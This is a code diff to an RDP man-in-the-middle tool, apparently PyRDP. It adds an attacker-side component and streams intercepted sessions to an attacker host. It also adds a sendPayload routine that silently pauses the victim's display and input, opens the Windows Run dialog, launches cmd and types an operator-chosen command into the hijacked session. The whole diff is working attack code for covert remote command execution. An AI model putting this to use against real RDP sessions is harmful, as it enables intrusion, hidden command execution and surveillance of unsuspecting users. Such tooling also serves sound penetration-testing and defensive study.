@@ -10,28 +10,30 @@ import datetime
 from twisted.internet import reactor
 from twisted.internet.protocol import Protocol
 
-from pyrdp.core import AwaitableClientFactory
+from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory
 from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext
-from pyrdp.enum import MCSChannelName, ParserMode, PlayerMessageType, SegmentationPDUType
-from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, TwistedTCPLayer, \
-    VirtualChannelLayer
+from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
+from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, VirtualChannelLayer
 from pyrdp.logging import RC4LoggingObserver
 from pyrdp.logging.adapters import SessionLogger
 from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, SlowPathLogger, X224Logger
 from pyrdp.mcs import MCSClientChannel, MCSServerChannel
+from pyrdp.mitm.AttackerMITM import AttackerMITM
 from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer
 from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
 from pyrdp.mitm.FastPathMITM import FastPathMITM
 from pyrdp.mitm.layerset import RDPLayerSet
 from pyrdp.mitm.MCSMITM import MCSMITM
+from pyrdp.mitm.MITMRecorder import MITMRecorder
 from pyrdp.mitm.SecurityMITM import SecurityMITM
 from pyrdp.mitm.SlowPathMITM import SlowPathMITM
 from pyrdp.mitm.state import RDPMITMState
 from pyrdp.mitm.TCPMITM import TCPMITM
 from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
 from pyrdp.mitm.X224MITM import X224MITM
-from pyrdp.recording import FileLayer, Recorder, RecordingFastPathObserver, RecordingSlowPathObserver
+from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
+from pyrdp.recording import FileLayer, RecordingFastPathObserver, RecordingSlowPathObserver
 
 
 class RDPMITM:
@@ -54,6 +56,9 @@ class RDPMITM:
         self.serverLog = log.createChild("server")
         """Base logger for the server side"""
 
+        self.attackerLog = log.createChild("attacker")
+        """Base logger for the attacker side"""
+
         self.rc4Log = log.createChild("rc4")
         """Logger for RC4 secrets"""
 
@@ -69,17 +74,17 @@ class RDPMITM:
         self.server = RDPLayerSet()
         """Layers on the server side"""
 
-        self.attacker = TwistedTCPLayer()
+        self.player = TwistedPlayerLayerSet()
         """Layers on the attacker side"""
 
-        self.recorder = Recorder([])
+        self.recorder = MITMRecorder([], self.state)
         """Recorder for this connection"""
 
         self.channelMITMs = {}
         """MITM components for virtual channels"""
 
         serverConnector = self.connectToServer()
-        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.attacker, self.getLog("tcp"), self.recorder, serverConnector)
+        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, serverConnector)
         """TCP MITM component"""
 
         self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, serverConnector, self.startTLS)
@@ -91,11 +96,13 @@ class RDPMITM:
         self.security: SecurityMITM = None
         """Security MITM component"""
 
-        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath)
+        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state)
         """Slow-path MITM component"""
 
         self.fastPath: FastPathMITM = None
         """Fast-path MITM component"""
+
+        self.attacker: AttackerMITM = None
 
         self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
         self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
@@ -106,6 +113,8 @@ class RDPMITM:
         self.server.mcs.addObserver(MCSLogger(self.getServerLog("mcs")))
         self.server.slowPath.addObserver(SlowPathLogger(self.getServerLog("slowpath")))
         self.server.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))
+
+        self.player.player.addObserver(LayerLogger(self.attackerLog))
 
         self.config.outDir.mkdir(parents=True, exist_ok=True)
         self.config.replayDir.mkdir(exist_ok=True)
@@ -159,12 +168,12 @@ class RDPMITM:
         await serverFactory.connected.wait()
 
         if self.config.attackerHost is not None and self.config.attackerPort is not None:
-            attackerFactory = AwaitableClientFactory(self.attacker)
+            attackerFactory = AwaitableClientFactory(self.player.tcp)
             reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)
 
             try:
                 await asyncio.wait_for(attackerFactory.connected.wait(), 1.0)
-                self.recorder.addTransport(self.attacker)
+                self.recorder.addTransport(self.player.tcp)
             except asyncio.TimeoutError:
                 self.log.error("Failed to connect to recording host: timeout expired")
 
@@ -218,20 +227,32 @@ class RDPMITM:
 
         self.client.security.addObserver(SecurityLogger(self.getClientLog("security")))
         self.client.fastPath.addObserver(FastPathLogger(self.getClientLog("fastpath")))
-        self.client.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerMessageType.FAST_PATH_INPUT))
+        self.client.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_INPUT))
 
         self.server.security.addObserver(SecurityLogger(self.getServerLog("security")))
         self.server.fastPath.addObserver(FastPathLogger(self.getServerLog("fastpath")))
-        self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerMessageType.FAST_PATH_OUTPUT))
+        self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_OUTPUT))
 
         self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
-        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath)
+        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state)
+
+        if self.player.tcp.transport:
+            self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)
+
+            if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
+                deviceRedirectionChannel = self.state.channelMap[MCSChannelName.DEVICE_REDIRECTION]
+
+                if deviceRedirectionChannel in self.channelMITMs:
+                    deviceRedirection: DeviceRedirectionMITM = self.channelMITMs[deviceRedirectionChannel]
+                    self.attacker.setDeviceRedirectionComponent(deviceRedirection)
 
         LayerChainItem.chain(client, self.client.security, self.client.slowPath)
         LayerChainItem.chain(server, self.server.security, self.server.slowPath)
 
         self.client.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.client.fastPath)
         self.server.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.server.fastPath)
+
+        self.sendPayload()
 
     def buildClipboardChannel(self, client: MCSServerChannel, server: MCSClientChannel):
         """
@@ -276,8 +297,11 @@ class RDPMITM:
         LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
         LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)
 
-        mitm = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.config)
-        self.channelMITMs[client.channelID] = mitm
+        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.config)
+        self.channelMITMs[client.channelID] = deviceRedirection
+
+        if self.attacker:
+            self.attacker.setDeviceRedirectionComponent(deviceRedirection)
 
     def buildVirtualChannel(self, client: MCSServerChannel, server: MCSClientChannel):
         """
@@ -296,3 +320,59 @@ class RDPMITM:
 
         mitm = VirtualChannelMITM(clientLayer, serverLayer)
         self.channelMITMs[client.channelID] = mitm
+
+    def sendPayload(self):
+        if len(self.config.payload) == 0:
+            return
+
+        if self.config.payloadDelay is None:
+            self.log.error("Payload was set but no delay is configured. Please configure a payload delay. Payload will not be sent for this connection.")
+            return
+
+        if self.config.payloadDuration is None:
+            self.log.error("Payload was set but no duration is configured. Please configure a payload duration. Payload will not be sent for this connection.")
+            return
+
+        def waitForDelay() -> int:
+            return self.config.payloadDelay
+
+        def disableForwarding() -> int:
+            self.state.forwardInput = False
+            self.state.forwardOutput = False
+            return 50
+
+        def openRunWindow() -> int:
+            self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
+            return 50
+
+        def sendCMD() -> int:
+            self.attacker.sendText("cmd")
+            return 50
+
+        def sendEnterKey() -> int:
+            self.attacker.sendKeys([ScanCode.RETURN])
+            return 50
+
+        def sendPayload() -> int:
+            self.attacker.sendText(self.config.payload + " & exit")
+            return 50
+
+        def waitForPayload() -> int:
+            return self.config.payloadDuration
+
+        def enableForwarding():
+            self.state.forwardInput = True
+            self.state.forwardOutput = True
+
+        sequencer = AsyncIOSequencer([
+            waitForDelay,
+            disableForwarding,
+            openRunWindow,
+            sendCMD,
+            sendEnterKey,
+            sendPayload,
+            sendEnterKey,
+            waitForPayload,
+            enableForwarding
+        ])
+        sequencer.run()
